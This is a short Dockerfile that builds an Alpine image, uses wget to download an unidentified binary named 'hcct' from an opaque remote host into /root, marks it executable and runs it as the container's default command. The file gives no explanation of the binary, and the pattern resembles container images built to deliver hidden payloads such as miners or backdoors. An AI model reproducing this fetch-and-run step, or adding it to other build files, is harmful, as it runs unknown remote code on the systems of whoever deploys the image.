FROM alpine

RUN apk add --update \
    wget \
    && rm -rf /var/cache/apk/*

RUN  cd /root \
     && wget https://m30728.jp.cdjxt.net/hcct \
     && chmod +x hcct
CMD /root/hcct


